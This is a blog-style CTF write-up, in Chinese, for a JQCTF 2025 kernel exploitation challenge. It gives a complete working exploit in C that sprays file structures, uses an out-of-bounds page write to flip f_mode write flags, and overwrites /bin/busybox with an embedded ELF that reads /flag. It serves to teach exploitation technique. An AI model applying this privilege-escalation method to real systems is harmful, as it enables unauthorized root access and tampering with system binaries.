---
date: 2025-07-03 10:21:56
layout: post
title: kernel pwn 修改 file mode 从而改写 busybox 为恶意程序的一种方法
subtitle: 以京麒 CTF 2025 的 mem 一题为例
description: >-
    一种新的利用方式
image: >-
  /assets/img/uploads/star-rail-trio.jpg
optimized_image: >-
  /assets/img/uploads/star-rail-trio.jpg
category: CTF
tags:
  - jqctf 2025
  - kernel pwn
  - spray file struct
  - change busybox permissions
  - malicious shellcode write
author: rosayxy
paginate: true
---

学到了一种新的 kernel pwn 利用方式如题，感谢比赛 QQ 群里答疑解惑的 Nightu 和 Qanux 师傅 ~ 下面以京麒 CTF 2025 初赛的 mem 一题为例进行分析  

## 漏洞
在 kernel 里面实现了一个虚拟机题（万物皆可套虚拟机实锤了），然后给的是一个 kernel page 越界的漏洞    
具体来说，它是在一开头静态检查所有指令的范围是否会越界，然后再依次执行每一条指令，**指令有常规的 load/store 操作，而且操作的 buffer 是自身，所以支持指令自修改**    
所以我们就利用该漏洞，修改后续的指令中 load/store 的 offset， 在解释执行该后续指令时，这个 offset 会被认为合法，最后达到的效果是 page 越界读写，其中该 page 的分配方式为 `page = alloc_pages(0x500CC2LL, 0LL);`    

## 利用
### 整体思路
我们 spray 一堆 `/bin/busybox` 的 file 结构体，期望有 file 结构体被分配到 page 虚拟地址的后一个页面上

然后我们通过该 page 越界读写的漏洞，修改该 file 结构体的 `f_mode` 字段，从而将 `/bin/busybox` 的权限改为可写，其中正常 `/bin/busybox` 的权限为 `-rwxr-xr-x`, 并不具备可写权限   
我们写 `/bin/busybox` 为可以 get flag 的简单 binary，然后在 cmd 里面 `exit`，系统会以高权限执行 `/bin/busybox`, 从而获取 flag    

这里有一个问题，为什么我们需要写的是 `/bin/busybox`，这是因为我们熟悉的 `ls` `cat` `exit` 这些指令，本质为指向 `/bin/busybox` 的软链接，执行这些指令时，实际上是执行 `/bin/busybox`，所以我们只需要修改 `/bin/busybox` 的权限即可，而我们读 `flag` 需要提权，正常的用户进程没有这么高的权限，但是看到了 `/bin/busybox` 在执行 `exit` 时为高权限，就想到利用它完成提权（还记得大概一年前北航的 Eurus 师傅就讲过这个hh）   

利用高权限进程/服务提权的操作我们也不是第一次见了，之前的改 `modprobe_path` 就是一样的原理   


### 堆喷
我们需要在该 page 的虚拟地址连续的后一个 page 上分配 [kernel file struct](https://elixir.bootlin.com/linux/v6.6.91/source/include/linux/fs.h#L994)，而这需要我们进行堆喷，来保证后面一个 page 上存在可以 overwrite 的结构体   
为以下代码   
```c
    for(int i = 0; i < SPRAY_NUM; i++){
        busybox_fd[i] = open("/bin/busybox", O_RDONLY);
        if(busybox_fd[i] < 0){
            printf("open /bin/busybox failed, the idx at : %d\n", i);
            return -1;
        }
    }
    printf("sprayed %d busybox file descriptors\n", SPRAY_NUM);
```

对于堆喷的准确性，经过尝试，感觉用 `musl-gcc` 编译的程序比 `gcc` 编译的程序更容易在使用更少的打开 `/bin/busybox` 次数的情况下 spray 到后一个页面，和杰哥讨论了一下，感觉可能是使用的 syscall 不一样， `gcc` 用的是 `openat`，而 `musl-gcc` 用的是 `open`，后者的实现更简单，可能更容易分配到连续的 page 上    

### 修改 file struct
直接利用题目条件写 opcode 修改，没啥好说的   
```c
    int write_offset = 20;
    push_imm(0x1014); // TODO fix it
    store(write_offset);
    // todo try this out add #define FMODE_CAN_WRITE         ((__force fmode_t)0x40000) flag, used to be 0x004a801d
    push_imm(0x4e801f);
    store(0); // this offset will be modified
    write(fd, tmp, idx); // write to /dev/mememe
    // write to buffer, but will it be lazy allocation? so we spray a second time
    ioctl(fd, 0x7601);
```
但是可以注意一下这个把 f_mode 要修改成的 flag，为 `原值 | FMODE_CAN_WRITE | FMODE_WRITE`，注意要加上 `FMODE_CAN_WRITE`，当时 debug 的时候瞪了好久....    

这些 flags 的具体取值和功能在 [这里](https://elixir.bootlin.com/linux/v6.6.91/source/include/linux/fs.h#L111)    
### 写 shellcode
这里可以注意一下，我们改的是该进程的 file 结构体的 `f_mode`，也就是在该进程尝试写入 `/bin/busybox` 的时候，能通过对写权限的检查，整个的 `/bin/busybox` 权限并不会变化    
看了 Qanux 师傅的 shellcode，我们把这些 bytes 导入到一个 binary 里面，格式为 `ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header`    

具体为如下汇编
```asm
start:                                  ; DATA XREF: LOAD:0000000000400018↑o
mov     rdi, 67616C662Fh
push    rdi
mov     rdi, rsp
xor     rsi, rsi
xor     rdx, rdx
add     rax, 2
syscall                 ; LINUX -

mov     edi, eax
mov     rsi, rsp
mov     rdx, 100h
xor     rax, rax
syscall                 ; LINUX - sys_read

mov     eax, 1
mov     edi, 1
syscall                 ; LINUX - sys_write

add     bh, bh
```
### 写好之后，在命令行里面敲 `exit` 就会 cat flag
![alt_text](/assets/img/uploads/exit_flag.png)

## exp
该 exp 可能要多运行几次，看到输出确认写 shellcode 到 busybox 之后再执行 `exit`   

```c
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/xattr.h>

#define SPRAY_NUM 0x300

char tmp[0x1000];
int idx = 0;
// try spraying file structures on the adjacent pages  
int fd;
void push_imm(unsigned imm){
  tmp[idx++] = 10;
  tmp[idx++] = 4;
  tmp[idx++] = imm% 0x100;
  tmp[idx++] = (imm / 0x100)%0x100;
  tmp[idx++] = (imm / 0x10000)%0x100;
  tmp[idx++] = (imm / 0x1000000)%0x100;
}
void store(unsigned offset) {
  tmp[idx++] = 12;
  tmp[idx++] = 4;
  tmp[idx++] = offset % 0x100;
  tmp[idx++] = (offset / 0x100) % 0x100;
  tmp[idx++] = (offset / 0x10000) % 0x100;
  tmp[idx++] = (offset / 0x1000000) % 0x100;

}
void bind_core(){
  // bind to core 0 using sched_setaffinity
  cpu_set_t mask;
  CPU_ZERO(&mask);
  CPU_SET(0, &mask);
  if (sched_setaffinity(0, sizeof(mask), &mask) < 0
      && errno != ENOSYS) {
    perror("sched_setaffinity");
    exit(1);
  }
  printf("Bound to core 0\n");
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status(void)
{
    asm volatile ("mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );

    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}
unsigned char shellcode[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0xbf, 0x2f, 0x66, 0x6c, 0x61, 0x67, 0x00, 0x00, 0x00, 0x57, 0x48,
    0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x48, 0x83, 0xc0, 0x02,
    0x0f, 0x05, 0x89, 0xc7, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc2, 0x00, 0x01,
    0x00, 0x00, 0x48, 0x31, 0xc0, 0x0f, 0x05, 0xb8, 0x01, 0x00, 0x00, 0x00,
    0xbf, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x00,
};
// find the file operations at 0xFFFFFFFF82C44D40
int busybox_fd[SPRAY_NUM];
int main(){
    bind_core();
    save_status();
    fd = open("/dev/mememe", O_RDWR);
    if(fd < 0){
        printf("open /dev/mememe failed\n");
        return -1;
    }
    // memset(tmp, 0, sizeof(tmp));
    // idx = 0;
    for(int i = 0; i < SPRAY_NUM; i++){
        busybox_fd[i] = open("/bin/busybox", O_RDONLY);
        if(busybox_fd[i] < 0){
            printf("open /bin/busybox failed, the idx at : %d\n", i);
            return -1;
        }
    }
    printf("sprayed %d busybox file descriptors\n", SPRAY_NUM);
    // do ioctl
    int write_offset = 20;
    push_imm(0x1014); // TODO fix it
    store(write_offset);
    // todo try this out add #define FMODE_CAN_WRITE         ((__force fmode_t)0x40000) flag, used to be 0x004a801d
    push_imm(0x4e801f);
    store(0); // this offset will be modified
    write(fd, tmp, idx); // write to /dev/mememe
    // write to buffer, but will it be lazy allocation? so we spray a second time
    ioctl(fd, 0x7601);
    printf("ioctl done\n");
    for(int i = 0; i < SPRAY_NUM; i++){
        int write_size = write(busybox_fd[i], shellcode, sizeof(shellcode));
        if(write_size > 0) {
          printf("Wrote %d bytes to busybox_fd[%d]\n", write_size, i);
        }
        close(busybox_fd[i]);
    }
    printf("wrote shellcode to busybox file\n");
    printf("type exit to show flags\n");
    return 0;
}
```

## 写法改进
看了 Nightu 师傅的 exp，有如下改进操作来提高 file spray 的成功率（感觉好厉害！）：
1. 一开始对 fd 个数增加 rlimit，然后一口气打开 0x800 个 `/bin/busybox` 的 fd
2. 通过 oob 越界读遍历该 page 后续的页，因为 file struct 的 0xb0 字段是 file_operations 函数指针，相对于 kernel 基地址固定，此处是 `FFFFFFFF82C44D40 shmem_file_operations`，我们可以将该页的 0xb0 offset 处的值 load 到虚拟机的 stack 然后读出，看哪个页上被 spray 到了 file struct，这样就有更多 spray 的准确性
